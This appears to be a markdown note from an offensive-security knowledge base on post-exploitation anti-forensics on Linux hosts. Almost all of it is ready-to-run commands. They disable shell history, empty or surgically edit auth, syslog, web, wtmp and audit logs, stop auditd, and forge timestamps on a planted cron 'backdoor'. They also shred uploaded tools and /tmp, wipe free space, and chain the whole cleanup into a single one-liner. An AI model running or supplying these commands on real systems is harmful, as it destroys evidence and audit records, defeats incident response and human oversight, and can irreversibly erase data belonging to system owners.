# Linux Log Removal & Anti-Forensics

**Tags:** #covering-tracks #linux #logs #opsec
**Phase:** Post-Exploitation → Cleanup

> **Rule:** Always plan cleanup BEFORE exploitation. Know what you touched.

---

## Shell History

```bash
# Disable history for current session (do this first)
export HISTFILE=/dev/null
export HISTSIZE=0
unset HISTFILE

# Clear existing history
history -c
history -w
cat /dev/null > ~/.bash_history
rm -f ~/.bash_history ~/.zsh_history ~/.python_history

# Secure delete (overwrite before remove)
shred -u ~/.bash_history
```

## Authentication Logs

```bash
# /var/log/auth.log (Ubuntu/Debian) — SSH logins
cat /dev/null > /var/log/auth.log
echo "" > /var/log/auth.log

# /var/log/secure (CentOS/RHEL)
cat /dev/null > /var/log/secure

# Remove your specific login (more surgical)
grep -v "$LHOST\|your_username" /var/log/auth.log > /tmp/auth_clean.log
cp /tmp/auth_clean.log /var/log/auth.log && shred -u /tmp/auth_clean.log
```

## System Logs

```bash
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/kern.log
cat /dev/null > /var/log/daemon.log
cat /dev/null > /var/log/cron.log

# Web logs (if you exploited web service)
cat /dev/null > /var/log/apache2/access.log
cat /dev/null > /var/log/apache2/error.log
cat /dev/null > /var/log/nginx/access.log
cat /dev/null > /var/log/nginx/error.log
```

## Login Records (wtmp/utmp/lastlog)

```bash
# These track logins — visible via 'last' command
echo '' | tee /var/log/wtmp /var/log/utmp
echo '' | tee /var/run/utmp

# Surgical: remove specific entries
utmpdump /var/log/wtmp | grep -v "your_ip\|your_user" | utmpdump -r > /tmp/wtmp.clean
cp /tmp/wtmp.clean /var/log/wtmp && shred -u /tmp/wtmp.clean

# lastlog (per-user last login)
lastlog | grep your_user
# Zero out specific entry
dd if=/dev/zero of=/var/log/lastlog bs=292 count=1 seek=$((uid * 1)) conv=notrunc
```

## File System Timestamps

```bash
# Change access/modify times (cover file access)
touch -t 202001010000 /tmp/malicious_file
touch -r /bin/ls /tmp/malicious_file   # Copy timestamps from legitimate file

# Use same timestamp as neighboring files
stat /etc/cron.d/some_existing_file    # Note timestamps
touch --reference=/etc/cron.d/legit_file /etc/cron.d/backdoor
```

## Uploaded Tools & Artifacts

```bash
# Secure delete (overwrite then remove)
shred -u /tmp/linpeas.sh
shred -u /tmp/chisel
shred -u /tmp/*.py

# Remove all traces from /tmp
shred -u /tmp/* 2>/dev/null
rm -rf /tmp/.* /tmp/* 2>/dev/null

# Clear /dev/shm
shred -u /dev/shm/* 2>/dev/null
```

## Kernel/System Logs

```bash
# Journald logs (systemd systems)
journalctl --flush
journalctl --rotate
journalctl --vacuum-time=1s

# Dmesg (kernel ring buffer)
dmesg -C   # Clear

# Auditd (audit daemon)
service auditd stop
cat /dev/null > /var/log/audit/audit.log
```

## Anti-Forensics

```bash
# Fill free space (prevents carving deleted files)
dd if=/dev/urandom of=/tmp/fill_space bs=1M 2>/dev/null; rm -f /tmp/fill_space

# Overwrite deleted file space
shred -n 3 -z /dev/sda1  # NEVER on a live OS — only forensic scenarios

# Memory cleanup — no direct option without root
# Drop caches (flushes pages, buffers, inodes)
sync && echo 3 > /proc/sys/vm/drop_caches
```

## One-Liner Full Cleanup

```bash
history -c; cat /dev/null > ~/.bash_history; \
cat /dev/null > /var/log/auth.log; \
cat /dev/null > /var/log/syslog; \
cat /dev/null > /var/log/apache2/access.log 2>/dev/null; \
shred -u /tmp/*.sh /tmp/*.py /tmp/*.elf 2>/dev/null; \
echo '' > /var/log/wtmp; \
export HISTFILE=/dev/null
```

## Related Notes

- [[09-Covering-Tracks/Windows-Log-Removal]] — Windows cleanup
- [[09-Covering-Tracks/Artifact-Cleanup]] — Generic artifact cleanup
- [[00-Quick-Reference/OPSEC]] — Real-time OPSEC during attack
